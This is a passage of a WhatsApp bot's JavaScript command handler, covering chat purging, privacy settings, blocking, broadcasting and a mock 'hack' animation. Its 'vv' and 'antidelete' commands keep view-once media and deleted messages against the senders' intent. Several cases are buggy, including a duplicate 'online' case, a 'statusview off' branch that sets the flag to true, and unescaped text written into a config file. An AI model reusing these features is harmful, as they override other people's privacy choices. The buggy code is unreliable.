            `📟 *RAM Usage:* ${ramUsage}MB / ${totalRam}MB\n` +
            `⚙️ *Host Name:* ${hostName}\n` +
            `📅 *Last Update:* ${lastUpdate}\n\n` +
            `📑 *Changelog:*\n${latestChangelog}\n\n` +
            `⭐ *GitHub Repo:* ${githubRepo}\n\n` +
            `${updateStatus}\n\n` +
            `👋 *Hey! Don't forget to fork & star the repo!*`;

        // Send the status message with an image
        await conn.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/ptpl5c.jpeg' },
            caption: statusMessage,
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    title: "Vinic-Xmd Update Check",
                    body: `Version: ${localVersion} | Commands: ${caseCount} | Status: ${needsUpdate ? 'Outdated' : 'Up-to-date'}`,
                    thumbnail: await getBuffer('https://files.catbox.moe/uy3kq9.jpg').catch(() => null),
                    mediaType: 1,
                    sourceUrl: githubRepo
                }
            }
        }, { quoted: m });

    } catch (error) {
        console.error('Error in checkupdate command:', error);
        reply('❌ An error occurred while checking for updates. Please try again later.');
    }
    
}
break
case "clearchat":
case "clear":
case "purge": {
    try {
        const isPrivateChat = !m.isGroup;
        
        // For private chats, only allow clearing your own messages or if you're the bot owner
        if (isPrivateChat && m.sender !== botNumber && !Access) {
            return reply('❌ *You can only clear your own messages in private chats.*');
        }

        // Get the number of messages to clear (default: 100)
        const messageCount = parseInt(args[0]) || 100;
        
        // Limit the number of messages that can be cleared at once
        const maxMessages = isPrivateChat ? 200 : 500;
        if (messageCount > maxMessages) {
            return reply(`❌ *Maximum ${maxMessages} messages can be cleared at once.*`);
        }
        if (messageCount < 1) {
            return reply('❌ *Please specify a number between 1-500.*');
        }

        // Confirmation for large deletions
        if (messageCount > 50 && args[1] !== 'confirm') {
            return reply(`⚠️ *WARNING:* This will delete ${messageCount} messages!\nType *${prefix}clearchat ${messageCount} confirm* to proceed.`);
        }

        await reply(`🗑️ *Clearing ${messageCount} messages...*`);

        // Get messages from the store
        const chatMessages = store.messages && store.messages[m.chat] ? store.messages[m.chat] : [];
        
        if (!chatMessages || chatMessages.length === 0) {
            return reply('❌ *No messages found to clear.*');
        }

        // Filter messages based on chat type and permissions
        let messagesToDelete = chatMessages
            .filter(msg => {
                if (!msg?.key?.id) return false; // Only messages with valid keys
                
                // In private chats, users can only delete their own messages unless they're the bot owner
                if (isPrivateChat) {
                    if (Access) return true; // Bot owners can delete all messages
                    return msg.key.fromMe || msg.key.participant === m.sender;
                }
                
                return true; // In groups, admins can delete all messages
            })
            .slice(-messageCount) // Get the most recent messages
            .reverse(); // Delete from newest to oldest

        if (messagesToDelete.length === 0) {
            return reply('❌ *No valid messages found to clear.*');
        }

        let deletedCount = 0;
        let failedCount = 0;
        const failedMessages = [];

        // Delete messages in batches with delays to avoid rate limiting
        for (let i = 0; i < messagesToDelete.length; i++) {
            const msg = messagesToDelete[i];
            
            try {
                await conn.sendMessage(m.chat, {
                    delete : {
                        remoteJid: m.chat,
                        fromMe: msg.key?.fromMe || false,
                        id: msg.key?.id,
                        participant: msg.key?.participant
                    }
                });
                
                deletedCount++;
                
                // Add delay to avoid rate limiting
                if (i % 5 === 0 && i > 0) {
                    await sleep(800);
                }
                
            } catch (error) {
                failedCount++;
                failedMessages.push(msg.key?.id || 'unknown');
                console.error('Failed to delete message:', error);
                
                // If we get rate limited, wait longer
                if (error.message?.includes('rate') || error.message?.includes('too many')) {
                    await sleep(2000);
                }
            }
        }

        // Prepare result message
        let resultMessage = `✅ *CHAT CLEANUP COMPLETE*\n\n`;
        resultMessage += `*Messages deleted:* ${deletedCount}\n`;
        resultMessage += `*Failed to delete:* ${failedCount}\n`;
        
        if (failedCount > 0) {
            resultMessage += `\n⚠️ *Some messages couldn't be deleted.*\n`;
            resultMessage += `This is usually because:\n`;
            resultMessage += `• Messages are too old (>1 week)\n`;
            resultMessage += `• Rate limiting by WhatsApp\n`;
            resultMessage += `• Permission issues\n`;
        }
        
        resultMessage += `\n💡 *Tip:* For best results, clear messages within 1 week of sending.`;

        await reply(resultMessage);

        // Clear from local store as well
        if (store.messages && store.messages[m.chat]) {
            store.messages[m.chat] = store.messages[m.chat].slice(0, -messageCount);
        }

    } catch (error) {
        console.error('Error in clearchat command:', error);
        
        if (error.message?.includes('rate') || error.message?.includes('too many')) {
            reply('❌ *Rate limited by WhatsApp.* Please wait a few minutes before trying again.');
        } else {
            reply('❌ *Failed to clear messages.* Please try again with a smaller number.');
        }
    }
    
}
break
case "online": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/match_last_seen\nExample: ${prefix + command} all`);

    const validOptions = ["all", "match_last_seen"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateOnlinePrivacy(text);
    await reply(mess.done);
}
break
case "'readreceipts": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Options: all/none\nExample: ${prefix + command} all`);

    const validOptions = ["all", "none"];
    if (!validOptions.includes(args[0])) return reply("Invalid option");

    await conn.updateReadReceiptsPrivacy(text);
    await reply(mess.done);
}
break
case "setpp": {
    if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (!/image/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);
    if (/webp/.test(mime)) return reply(`*Send or reply to an image With captions ${prefix + command}*`);

    const medis = await conn.downloadAndSaveMediaMessage(quoted, "ppbot.jpeg");

    if (args[0] === "full") {
      const { img } = await generateFullProfilePic(medis);
      await conn.query({
        tag: "iq",
        attrs: {
          to: botNumber,
          type: "set",
          xmlns: "w:profile:picture",
        },
        content: [
          {
            tag: "picture",
            attrs: {
              type: "image",
            },
            content: img,
          },
        ],
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    } else {
      await conn.updateProfilePicture(botNumber, {
        url: medis,
      });
      fs.unlinkSync(medis);
      reply(mess.done);
    }
}
break
case "lastseen": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist, none\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist", "none"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateLastSeenPrivacy(option);
        reply(`✅ *Last seen privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getLastSeenDescription(option)}`);
    } catch (error) {
        console.error('Error setting last seen privacy:', error);
        reply('❌ *Failed to update last seen settings.* Please try again.');
    }
   
}
break
case "gcprivacy":
case "gcaddprivacy": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateGroupsAddPrivacy(option);
        reply(`✅ *Group add privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getGroupAddDescription(option)}`);
    } catch (error) {
        console.error('Error setting group add privacy:', error);
        reply('❌ *Failed to update group add settings.* Please try again.');
    }
    
}
break
case "online": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, match_last_seen\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "match_last_seen"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateOnlinePrivacy(option);
        reply(`✅ *Online privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getOnlineDescription(option)}`);
    } catch (error) {
        console.error('Error setting online privacy:', error);
        reply('❌ *Failed to update online status settings.* Please try again.');
    }
    
}
break
case "ppprivacy": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix + command} [option]\n\n*Options:* all, contacts, contact_blacklist, none\n*Example:* ${prefix + command} all`);

    const validOptions = ["all", "contacts", "contact_blacklist", "none"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) {
        return reply(`❌ *Invalid option!*\n\nValid options: ${validOptions.join(', ')}\nExample: ${prefix + command} all`);
    }

    try {
        await conn.updateProfilePicturePrivacy(option);
        reply(`✅ *Profile picture privacy set to:* ${option.toUpperCase()}\n\n*What this means:*\n${getProfilePictureDescription(option)}`);
    } catch (error) {
        console.error('Error setting profile picture privacy:', error);
        reply('❌ *Failed to update profile picture privacy settings.* Please try again.');
    }
    
}
break
case "disappear":
case "disappearing":
case "ephemeral":
case "vanish": {
    if (!Access) return reply(mess.owner);
    
    if (!text) {
        let disappearInfo = `⏰ *DISAPPEARING MESSAGES*\n\n`;
        disappearInfo += `*Make messages automatically disappear after:*\n\n`;
        disappearInfo += `• ${prefix}disappear 24h - 24 hours\n`;
        disappearInfo += `• ${prefix}disappear 7d - 7 days\n`;
        disappearInfo += `• ${prefix}disappear 90d - 90 days\n`;
        disappearInfo += `• ${prefix}disappear off - Turn off disappearing messages\n\n`;
        disappearInfo += `*Usage Examples:*\n`;
        disappearInfo += `${prefix}disappear 24h - Messages disappear after 24 hours\n`;
        disappearInfo += `${prefix}disappear off - Disable disappearing messages\n\n`;
        disappearInfo += `*Note:* This affects the current chat only.`;

        return reply(disappearInfo);
    }

    const option = text.toLowerCase().trim();
    
    try {
        if (option === 'off') {
            // Turn off disappearing messages
            await conn.sendMessage(m.chat, {
                message: { 
                    protocolMessage: { 
                        type: 5, // DISAPPEARING_MESSAGE
                        key: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: Math.random().toString(36).substring(7)
                        },
                        disappearingMode: {
                            initiator: "INITIATED_BY_ME",
                            trigger: "CHAT_SETTING"
                        }
                    } 
                }
            });
            
            reply('✅ *Disappearing messages turned OFF!*\n\nMessages will no longer automatically disappear.');
            
        } else if (option === '24h' || option === '24hours') {
            // 24 hours
            await conn.sendMessage(m.chat, {
                message: { 
                    protocolMessage: { 
                        type: 5, // DISAPPEARING_MESSAGE
                        key: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: Math.random().toString(36).substring(7)
                        },
                        disappearingMode: {
                            initiator: "INITIATED_BY_ME",
                            trigger: "CHAT_SETTING",
                            duration: 86400 // 24 hours in seconds
                        }
                    } 
                }
            });
            
            reply('✅ *Disappearing messages set to 24 hours!*\n\nMessages will automatically disappear after 24 hours.');
            
        } else if (option === '7d' || option === '7days') {
            // 7 days
            await conn.sendMessage(m.chat, {
                message: { 
                    protocolMessage: { 
                        type: 5, // DISAPPEARING_MESSAGE
                        key: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: Math.random().toString(36).substring(7)
                        },
                        disappearingMode: {
                            initiator: "INITIATED_BY_ME",
                            trigger: "CHAT_SETTING",
                            duration: 604800 // 7 days in seconds
                        }
                    } 
                }
            });
            
            reply('✅ *Disappearing messages set to 7 days!*\n\nMessages will automatically disappear after 7 days.');
            
        } else if (option === '90d' || option === '90days') {
            // 90 days
            await conn.sendMessage(m.chat, {
                message: { 
                    protocolMessage: { 
                        type: 5, // DISAPPEARING_MESSAGE
                        key: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: Math.random().toString(36).substring(7)
                        },
                        disappearingMode: {
                            initiator: "INITIATED_BY_ME",
                            trigger: "CHAT_SETTING",
                            duration: 7776000 // 90 days in seconds
                        }
                    } 
                }
            });
            
            reply('✅ *Disappearing messages set to 90 days!*\n\nMessages will automatically disappear after 90 days.');
            
        } else {
            reply(`❌ *Invalid option!*\n\nValid options: 24h, 7d, 90d, off\nExample: ${prefix}disappear 24h`);
        }

    } catch (error) {
        console.error('Error setting disappearing messages:', error);
        reply('❌ *Failed to set disappearing messages.* Please try again.');
    }
    
}
break
// Alternative simpler method using group setting update (for groups only)
case "disappeargroup":
case "groupdisappear": {
    if (!Access) return reply(mess.owner);
    if (!m.isGroup) return reply('❌ This command only works in groups!');
    
    if (!text) {
        return reply(`⏰ *GROUP DISAPPEARING MESSAGES*\n\n*Options:*\n• ${prefix}disappeargroup 24h\n• ${prefix}disappeargroup 7d\n• ${prefix}disappeargroup 90d\n• ${prefix}disappeargroup off\n\n*Example:* ${prefix}disappeargroup 24h`);
    }

    const option = text.toLowerCase().trim();
    
    try {
        if (option === 'off') {
            await conn.groupSettingUpdate(m.chat, 'disappearing_messages', false);
            reply('✅ *Group disappearing messages turned OFF!*');
            
        } else if (option === '24h' || option === '24hours') {
            await conn.groupSettingUpdate(m.chat, 'disappearing_messages', 86400);
            reply('✅ *Group disappearing messages set to 24 hours!*');
            
        } else if (option === '7d' || option === '7days') {
            await conn.groupSettingUpdate(m.chat, 'disappearing_messages', 604800);
            reply('✅ *Group disappearing messages set to 7 days!*');
            
        } else if (option === '90d' || option === '90days') {
            await conn.groupSettingUpdate(m.chat, 'disappearing_messages', 7776000);
            reply('✅ *Group disappearing messages set to 90 days!*');
            
        } else {
            reply(`❌ *Invalid option!*\nValid options: 24h, 7d, 90d, off`);
        }

    } catch (error) {
        console.error('Error setting group disappearing messages:', error);
        reply('❌ *Failed to set group disappearing messages.* Make sure I am admin.');
    }
    
}
break
// Add this to check current disappearing settings
case "disappearstatus":
case "vanishstatus": {
    try {
        // This is a simplified check - actual implementation would require
        // checking group metadata or message properties
        
        let statusMessage = `⏰ *DISAPPEARING MESSAGES STATUS*\n\n`;
        
        if (m.isGroup) {
            statusMessage += `*Group:* ${groupName}\n`;
            statusMessage += `*Status:* Checking...\n\n`;
            statusMessage += `*To change:* Use ${prefix}disappeargroup [time]`;
        } else {
            statusMessage += `*Private Chat*\n`;
            statusMessage += `*Status:* Checking...\n\n`;
            statusMessage += `*To change:* Use ${prefix}disappear [time]`;
        }
        
        statusMessage += `\n*Available times:* 24h, 7d, 90d, off`;
        
        reply(statusMessage);
        
    } catch (error) {
        console.error('Error checking disappear status:', error);
        reply('❌ *Failed to check disappearing messages status.*');
    }
    
}
break 
case "del": {
if (!Access) return reply(mess.owner);
    if (!m.quoted) return reply(`*Please reply to a message*`);

    try {
     
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.quoted.fakeObj.key.remoteJid,
          fromMe: m.quoted.fakeObj.key.fromMe,
          id: m.quoted.fakeObj.key.id,
          participant: m.quoted.fakeObj.participant,
        }
      });

      
      await conn.sendMessage(m.chat, {
        delete: {
          remoteJid: m.key.remoteJid,
          fromMe: m.key.fromMe,
          id: m.key.id,
          participant: m.key.participant,
        }
      });

    } catch (err) {
      console.error(err);
      reply("⚠️ Failed to delete message.");
   }

}
break
case "react": {
if (!Access) return reply(mess.owner);
    if (!args) return reply(`*Reaction emoji needed*\n Example .react 🤔`);

    const reactionMessage = {
      react: {
        text: args[0],
        key: { remoteJid: m.chat, fromMe: true, id: quoted.id },
      },
    };
    conn.sendMessage(m.chat, reactionMessage);
}
break
case "vv2": {
if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Reply to an Image or Video*`);

    if (/image/.test(mime)) {
      const anuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          image: { url: anuan },
          caption: mess.done,
          fileLength: "999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/video/.test(mime)) {
      const anuanuan = await Cypher.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          video: { url: anuanuan },
          caption: mess.done,
          fileLength: "99999999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/audio/.test(mime)) {
      const bebasap = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(m.chat, {
        audio: { url: bebasap },
        mimetype: "audio/mpeg",
        ptt: true,
        viewOnce: true
      });
    }
}
break
case 'creategc': case 'creategroup': {
if (!Access) return reply(mess.owner)
if (!args.join(" ")) return reply(`Use ${prefix+command} groupname`)
try {
let cret = await conn.groupCreate(args.join(" "), [])
let response = await conn.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
conn.sendMessage(m.chat, { text:teksop, mentions: await conn.parseMention(teksop)}, {quoted:m})
} catch {
	reply(`Error`)
	}
}
break
case "gpass": {
let length = text ? parseInt(text) : 12;
    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
    let pass = "";
    for (let i = 0; i < length; i++) {
      pass += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    try {
      conn.sendMessage(m.chat, { text: pass }, { quoted: m });
    } catch (error) {
      console.error('Error generating password:', error);
      reply('An error occurred while generating the password.');
    }
}
break
case "block": {
if (!Access) return reply(mess.owner);
    if (!m.quoted && !m.mentionedJid[0] && !text) return reply("Reply to a message or mention/user ID to block");

    const userId = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await conn.updateBlockStatus(userId, "block");
    reply(mess.done);
}
break
case "public": {
if (!Access) return reply(mess.owner) 
conn.public = true
reply(`*Vinic-Xmd successfully changed to public mode* ${command}.`)
}
break
case 'readviewonce': case 'vv': {
    try {
        if (!m.quoted) return reply('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return reply('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
            await conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        }

        if (quotedMessage.videoMessage) {
            let videoCaption = quotedMessage.videoMessage.caption || '';
            let videoUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
            await conn.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        }

        if (quotedMessage.audioMessage) {
            let audioUrl = await conn.downloadAndSaveMediaMessage(quotedMessage.audioMessage);
            await conn.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' });
        }

    } catch (error) {
        console.error('Error processing vv command:', error);
        reply('❌ An error occurred while processing your request.');
    }
    
}
break
case "listblocked": {
if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();

      if (!blockedList.length) {
        return reply('✅ No contacts are currently blocked.');
      }

      let blockedUsers = blockedList.map((user, index) => `🔹 *${index + 1}.* @${user.split('@')[0]}`).join('\n');

      await conn.sendMessage(m.chat, {
        text: `🚫 *Blocked Contacts:*\n\n${blockedUsers}`,
        mentions: blockedList
      }, { quoted: m });

    } catch (error) {
      reply('⚠️ Unable to fetch blocked contacts.');
  }
}
break
case "unblock": {
if (!Access) return reply(mess.owner);
    if (!m.quoted && !m.mentionedJid[0] && !text) return reply("Reply to a message or mention/user ID to unblock");

    const userId = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await conn.updateBlockStatus(userId, "unblock");
    reply(mess.done);
}
break
case "antidelete": {
if (!Access) return reply(mess.owner);
if (args.length < 2) return reply(`Example: ${prefix + command} private on/off\nOr: ${prefix + command} chat on/off`);

const validTypes = ["private", "chat"];
const validOptions = ["on", "off"];

const type = args[0].toLowerCase();
const option = args[1].toLowerCase();

if (!validTypes.includes(type)) return reply("Invalid type. Use 'private' or 'chat'");
if (!validOptions.includes(option)) return reply("Invalid option. Use 'on' or 'off'");

// Fix: Properly get setting from global database
if (!global.db.data.settings) global.db.data.settings = {};
if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
let setting = global.db.data.settings[botNumber];

// Initialize config if it doesn't exist
if (!setting.config) setting.config = {};

// Set the anti-delete configuration based on type
if (type === "private") {
    setting.config.statusantidelete = option === "on" ? "private" : false;
} else if (type === "chat") {
    setting.config.statusantidelete = option === "on" ? "chat" : false;
}

// Also update the global antidelete variable
global.antidelete = setting.config.statusantidelete;

await saveDatabase();

reply(`Anti-delete ${type} mode ${option === "on" ? "enabled" : "disabled"} successfully`);
}
break
case "anticall": {
    if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} block/decline/off\n\nblock - Declines and blocks callers\ndecline - Declines incoming calls\noff - Disables anticall`);

    const validOptions = ["block", "decline", "off"];
    const option = args[0].toLowerCase();

    if (!validOptions.includes(option)) return reply(`Invalid option; type *${prefix}anticall* to see available options!`);

    // Update global anticall setting
    global.anticall = option;
    
    // Save to settings if you have a settings system
    // For now, we'll just use the global variable
    
    reply(`Anti-call set to *${option}* successfully.`);
}
break
case 'chatbot': {
    if (!isOwner) {
        reply(mess.owner);
        break;
    }
    
    global.chatbot = global.chatbot === 'true' ? 'false' : 'true';
    reply(`✅ Chatbot ${global.chatbot === 'true' ? 'enabled' : 'disabled'}`);
    
}
break 
case "leave": {
    if (!Access) return reply(mess.owner);
    if (!m.isGroup) return reply(mess.group);
    
    // Send the goodbye message
    reply("*Goodbye, it was nice being here!*");
    
    // React with 👋 emoji to the command message
    await conn.sendMessage(m.chat, {
        react: {
            text: "👋",
            key: m.key
        }
    });
    
    await sleep(3000);
    await conn.groupLeave(m.chat);
}
break
case 'statusview':{
             if (!Access) return reply(mess.owner)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  autostatus = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autostatus = true
                  reply(`${command} is disabled`)
               }
            }
            
break
case "getpp": {
    if (!Access) return reply(mess.owner);
    if (!m.quoted) {
        // React with 📷 even if no user is quoted
        await conn.sendMessage(m.chat, {
            react: {
                text: "📷",
                key: m.key
            }
        });
        return reply('Reply to a user to get their profile picture.');
    }

    // React with 📷 emoji to the command message
    await conn.sendMessage(m.chat, {
        react: {
            text: "📷",
            key: m.key
        }
    });

    const userId = m.quoted.sender;

    try {
        const ppUrl = await conn.profilePictureUrl(userId, 'image');

        await conn.sendMessage(m.chat, 
            { 
                image: { url: ppUrl }, 
                caption: `⌘ *Profile Picture of:* @${userId.split('@')[0]}`,
                mentions: [ userId ]
            }, { quoted: m }); 
    } catch {
        await conn.sendMessage(m.chat, { 
            image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
            caption: '⚠️ No profile picture found.' 
        }, { quoted: m });
    }
}
break 
case "setprefix": {
    if (!Access) return reply(mess.owner);
    if (args.length < 1) return reply(`Example: ${prefix + command} .\nOr: ${prefix + command} /`);

    let newPrefix = args[0];
    
    // Validate prefix length
    if (newPrefix.length > 3) {
        return reply("❌ Prefix cannot be longer than 3 characters.");
    }
    
    // Check if prefix contains only allowed characters
    if (!/^[.!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~]/.test(newPrefix)) {
        return reply("❌ Prefix must be a symbol character (e.g., . ! @ # $ etc.)");
    }

    // Use setting.config structure
    if (!global.db.data.settings) global.db.data.settings = {};
    if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
    let setting = global.db.data.settings[botNumber];

    // Initialize config if it doesn't exist
    if (!setting.config) setting.config = {};

    // Store the old prefix for the message
    const oldPrefix = setting.config.prefix || prefix;

    // Set the new prefix in config
    setting.config.prefix = newPrefix;

    // Also update the global prefix variable if it exists
    if (global.prefix) {
        global.prefix = newPrefix;
    }

    reply(`✅ Prefix changed from *"${oldPrefix}"* to *"${newPrefix}"* successfully.\n\nNow you can use commands like: *${newPrefix}menu*`);

    await saveDatabase();
    
}
break
case "setownername": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix}setownername [new name]\n\n*Example:* ${prefix}setownername Kevin Tech`);

    try {
        // Update global variable immediately (no restart needed)
        global.ownername = text;
        
        // Also update the config file for persistence after restart
        const configPath = './setting/config.js';
        let configContent = fs.readFileSync(configPath, 'utf-8');
        
        // Update the ownername in the config
        const updatedConfig = configContent.replace(
            /global\.ownername\s*=\s*["'][^"']*["']/,
            `global.ownername = "${text}"`
        );
        
        // Write the updated config back
        fs.writeFileSync(configPath, updatedConfig);
        
        reply(`✅ *Owner name successfully changed to:* ${text}\n\n*Note:* This change is effective immediately and will persist after restart.`);
        
    } catch (error) {
        console.error('Error setting owner name:', error);
        reply('❌ *Failed to update owner name.* Please check file permissions or try again.');
    }
    
    
}
break
case "toviewonce": {
if (!Access) return reply(mess.owner);
    if (!quoted) return reply(`*Reply to an Image or Video*`);

    if (/image/.test(mime)) {
      const anuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          image: { url: anuan },
          caption: mess.done,
          fileLength: "999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/video/.test(mime)) {
      const anuanuan = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(
        m.chat,
        {
          video: { url: anuanuan },
          caption: mess.done,
          fileLength: "99999999",
          viewOnce: true
        },
        { quoted: m }
      );
    } else if (/audio/.test(mime)) {
      const bebasap = await conn.downloadAndSaveMediaMessage(quoted);
      conn.sendMessage(m.chat, {
        audio: { url: bebasap },
        mimetype: "audio/mpeg",
        ptt: true,
        viewOnce: true
      });
   }
}
break
case "private": {
if (!Access) return reply(mess.owner) 
conn.public = false
reply(`*Vinic-Xmd successfully changed to private mode*  ${command}.`)
}
break
case "autotyping": {
    if (!Access) return reply(mess.owner);
    
    if (!text) {
        const status = global.autoTyping ? "✅ ON" : "❌ OFF";
        return reply(`*Auto-Typing Status:* ${status}\n\nUsage: ${prefix}autotyping on/off`);
    }

    const option = args[0].toLowerCase();
    
    if (option === 'on') {
        global.autoTyping = true;
        reply('✅ *Auto-typing enabled!* The bot will now show typing indicators.');
    } 
    else if (option === 'off') {
        global.autoTyping = false;
        reply('❌ *Auto-typing disabled!*');
    } 
    else {
        reply(`❌ Invalid option! Use: ${prefix}autotyping on/off`);
    }
    
    // Save to config file for persistence
    try {
        const configPath = './setting/config.js';
        let configContent = fs.readFileSync(configPath, 'utf-8');
        
        // Update the autoTyping setting
        const updatedConfig = configContent.replace(
            /global\.autoTyping\s*=\s*(true|false)/,
            `global.autoTyping = ${global.autoTyping}`
        );
        
        fs.writeFileSync(configPath, updatedConfig);
    } catch (error) {
        console.error('Error saving autoTyping setting:', error);
    }
    
    
}
break
case " join": {
if (!Access) return reply(mess.owner);
    if (!text) return reply("Enter group link");
    if (!isUrl(args[0]) && !args[0].includes("whatsapp.com")) return reply("Invalid link");

    try {
      const link = args[0].split("https://chat.whatsapp.com/")[1];
      await conn.groupAcceptInvite(link);
      reply("Joined successfully");
    } catch {
      reply("Failed to join group");
    }
}
break
case "broadcast": {
if (!Access) return reply("*You are not my owner 😜!*");
    if (args.length === 0) return reply("📢 Please provide a message to broadcast.");
    const message = args.join(' ');
    const groups = Object.keys(await conn.groupFetchAllParticipating());
    for (const groupId of groups) {
        await conn.sendMessage(groupId, { text: message }, { quoted: mek });
    }
    reply("📢 Message broadcasted to all groups.");
}
break
case "groupjids": {
    if (!Access) return reply("*Your are not my owner* 😜!");
    const groups = await conn.groupFetchAllParticipating();
    const groupJids = Object.keys(groups).join('\n');
    reply(`📝 *Group JIDs:*\n\n${groupJids}`);
}
break
case "hack": {
try {
        const steps = [
            '💻 *HACKING SEQUENCE INITIATED...* 💻',
            '',
            '*Loading encryption bypass modules...* 🔐',
            '*Establishing secure connection to mainframe...* 🌐',
            '*Deploying rootkits...* 🛠️',
            '',
            '```[▓▓                    ] 10%``` ⏳',
            '```[▓▓▓▓▓                ] 30%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓           ] 50%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓       ] 70%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] 90%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%``` ✅',
            '',
            '🔒 *System Breach Successful!* 🔓',
            '*Gaining access to server logs...* 🖥️',
            '*Extracting sensitive data...* 📂',
            '',
            '```[DATA CAPTURED: 3.2GB]``` 📡',
            '```[TRANSMISSION SECURED]``` 🔒',
            '',
            '🚀 *Operation Complete!*',
            '',
            '⚠️ _This is a simulated hacking activity for entertainment purposes._',
            '⚠️ _Remember: Ethical hacking ensures safety._',
            '',
            '> *Vinic-Xmd: hacking simulation complete* ☣'
  
        ];

        for (const step of steps) {
            await conn.sendMessage(from, { text: step }, { quoted: mek });
            await new Promise(resolve => setTimeout(resolve, 1200)); // Adjust delay for realism
        }
    } catch (error) {
        console.error(error);
        reply(`❌ *Error:* ${error.message}`);
    }
}
break
case "request": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} I would like a new feature (specify) to be added.`);

    const requestMsg = `
*REQUEST*

*User*: @${m.sender.split("@")[0]}
*Request*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your request has been forwarded to my developer.
Please wait for a reply.

*Details:*
${requestMsg}
    `;

    conn.sendMessage("256742932677@s.whatsapp.net", { text: requestMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "reportbug": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} Hey, play command isn't working`);

    const bugReportMsg = `
